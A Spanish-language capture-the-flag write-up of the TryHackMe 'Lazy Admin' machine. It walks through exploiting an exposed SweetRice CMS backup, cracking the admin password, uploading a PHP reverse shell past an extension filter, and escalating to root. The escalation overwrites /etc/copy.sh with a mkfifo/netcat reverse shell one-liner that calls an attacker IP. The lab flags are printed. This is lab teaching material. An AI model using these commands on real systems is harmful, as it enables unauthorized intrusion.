# 1. Lazy Admin

## a) ¿Cuál es la flag de usuario?

Comenzaremos con un escaneo básico usando nmap para ver los puertos abiertos y sus servicios, así:

```
nmap -sV -T5 10.10.89.75
```

Vemos que la máquina objetivo tiene dos puertos abiertos, el 22 con un servicio SSH y el 80 con un servidor web Apache.

![](IMG/Pasted%20image%2020250417013605.png)

Echaremos un vistazo a la página web. Obtenemos la página por defecto de Apache.

![](IMG/Pasted%20image%2020250417013814.png)

Haremos un escaneo con GObuster para listar los directorios, a ver si encontramos algo interesante, porque de momento poco tenemos.

```
gobuster dir -u http://10.10.89.75 -w /usr/share/dirb/wordlists/common.txt
```

Hemos descubierto una nueva ruta, /content.

![](IMG/Pasted%20image%2020250417014108.png)

Accedemos a la ruta descubierta y vemos que hay instalado un CMS llamado Sweetrice.

![](IMG/Pasted%20image%2020250417014203.png)

Sabemos el nombre del CMS pero no la versión concreta, por lo que buscamos en google simplemente como averiguar la versión del mismo, uno de los resultados nos lleva al repositorio de sweetrice en Github y vemos que la versión se muestra en el archivo changelog.txt.

![](IMG/Pasted%20image%2020250417015919.png)

Lo visitamos y vemos que la versión instalada es la 1.5.0

![](IMG/Pasted%20image%2020250417020003.png)

Con estos datos, buscamos algún exploit que nos pueda servir en [exploit-db](https://www.exploit-db.com/), donde encontramos uno que nos permite obtener una copia de seguridad de la que, con suerte, podremos obtener información útil.

![](IMG/Pasted%20image%2020250417020133.png)

Nos dice concretamente que podemos acceder a las copias de seguridad de la base de datos en la ruta http://localhost/inc/mysql_backup y a las copias de seguridad de la página web en la ruta http://localhost/SweetRice-transfer.zip. A nosotros de momento nos interesa la copia de seguridad de la base de datos.

![](IMG/Pasted%20image%2020250417020238.png)

Accedemos a la ruta dada, y efectivamente, tenemos una copia de seguridad.

![](IMG/Pasted%20image%2020250417020629.png)

La descargamos para ver el contenido.

![](IMG/Pasted%20image%2020250417020842.png)

Encontramos, nombres de usuario y lo que parece ser el hash de una contraseña.

![](IMG/Pasted%20image%2020250417021023.png)

Vamos a probar a descifrar el hash, por si fuera conocido en alguna web destinadas a ello, concretamente en [hashes.com](https://hashes.com/en/decrypt/hash), y nos dice que la contraseña es Password123.

![](IMG/Pasted%20image%2020250417021245.png)

Ya tenemos nombres de usuario y la contraseña, tan solo nos queda encontrar la ruta al panel de administración para intentar acceder. Usaobuster, pero en esta ocasión sobre el directorio /Content

```
gobuster dir -u http://10.10.89.75/content -w /usr/share/dirb/wordlists/common.txt
```

Tras probar las rutas obtenidas, descubrimos que el panel de administración es accesible a través de la ruta /as

![](IMG/Pasted%20image%2020250417021609.png)

![](IMG/Pasted%20image%2020250417021703.png)

Tratamos de acceder con las credenciales que tenemos.

el usuario "admin" no es. Probamos con "manager".

![](IMG/Pasted%20image%2020250417021744.png)

Y ahora sí, tenemos acceso.

![](IMG/Pasted%20image%2020250417021844.png)

Revisamos el panel de administración y encontramos la opción "Media center", que nos permite subir archivos a la web. Trataremos de subir una shell reversa, como siempre, usaremos la de [Pentest monkey](https://github.com/pentestmonkey/php-reverse-shell), que ya con tantas máquinas en las que la hemos usado, se está convirtiendo en todo un clásico.

![](IMG/Pasted%20image%2020250417022243.png)

Descargaremos la shell la configuraremos y la subiremos a la web.

![](IMG/Pasted%20image%2020250417022349.png)

![](IMG/Pasted%20image%2020250417022450.png)

Hemos intentado subirlo, pero no ha habido éxito, debe ser por la extensión que debe estar restringida, la cambiaremos de php a phtml como ya hicimos anteriormente en otra máquina, para hacer bypass a la protección.

![](IMG/Pasted%20image%2020250417022644.png)

Y ahora sí, ya lo tenemos subido.

![](IMG/Pasted%20image%2020250417022709.png)

Ahora, ejecutaremos un listener con netcat para recibir la shell.

```
nc -lvnp 1234
```

![](IMG/Pasted%20image%2020250417022751.png)

Y ejecutamos nuestra shell reversa en el navegador, podemos hacerlo clicando sobre el archivo que hemos subido en la página anterior.

![](IMG/Pasted%20image%2020250417022913.png)

Y obtendremos en nuestro listener el acceso a la shell.

![](IMG/Pasted%20image%2020250417022946.png)

Como hemos hecho en otras máquinas, trataremos de conseguir una shell mas estable e interactiva, para ello usamos:

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

![](IMG/Pasted%20image%2020250417023057.png)

Ahora, buscaremos el archivo user.txt y lo abriremos para obtener la flag de usuario.

![](IMG/Pasted%20image%2020250417023206.png)

**Respuesta: THM{63e5bce9271952aad1113b6f1ac28a07}**

## b) ¿Cuál es la flag de root?

Ahora, trataremos de escalar privilegios, para ello, comenzaremos con ejecutar sudo -l para ver que comandos puede ejecutar el usuario con permisos root.

![](IMG/Pasted%20image%2020250417023338.png)

Vemos que puede usar /usr/bin/perl y /home/itguy/backup.pl con permisos de root. Echaremos un vistazo al contenido del archivo backup.pl.

![](IMG/Pasted%20image%2020250417023506.png)

Vemos que este archivo ejecuta el script /etc/copy.sh. Así que vamos a tratar de modificar ese archivo para escalar privilegios.

![](IMG/Pasted%20image%2020250417023646.png)

Descubrimos que ya tenemos el trabajo casi hecho, ya que el script contiene código para enviar una shell root a la ip y el puerto que se configuren, así que solo tenemos que modificar la Ip y el puerto existentes en el archivo por la Ip y puerto de escucha de nuestra máquina atacante. Usamos:

```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 10.8.16.0 4444 > /tmp/f" > /etc/copy.sh
```

![](IMG/Pasted%20image%2020250417024138.png)

Y ejecutaremos otro listener con el puerto 4444 con netcat para recibir la shell con permisos root.

```
nc -lvnp 4444
```

![](IMG/Pasted%20image%2020250417024238.png)

Ejecutaremos el archivo perl "backup.pl".

```
sudo /usr/bin/perl /home/itguy/backup.pl
```

![](IMG/Pasted%20image%2020250417024346.png)

Y en nuestro listener, ya hemos recibido la shell.

![](IMG/Pasted%20image%2020250417024412.png)

Ya sólo tenemos que buscar el archivo root.txt y abrirlo para ver la flag. (el archivo está donde siempre, /root/root.txt, que originales son)

![](IMG/Pasted%20image%2020250417024523.png)

**Respuesta: THM{6637f41d0177b6f37cb20d775124699f}**